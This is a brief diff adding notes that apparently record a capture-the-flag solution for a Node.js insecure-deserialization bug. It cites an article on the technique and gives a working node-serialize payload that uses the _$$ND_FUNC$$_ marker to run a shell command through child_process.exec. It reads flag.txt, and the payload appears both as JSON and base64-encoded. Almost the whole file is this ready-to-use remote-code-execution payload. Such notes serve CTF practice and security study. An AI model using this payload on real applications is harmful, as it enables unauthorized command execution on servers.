@@ -1,0 +1,6 @@
+article:
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+command:
+{"rce":"_$$ND_FUNC$$_require('child_process').exec('cat flag.txt', function(error, stdout, stderr) { console.log(stdout) })"}
+to base64:
+eyJyY2UiOiJfJCRORF9GVU5DJCRfcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2NhdCBmbGFnLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pIn0=
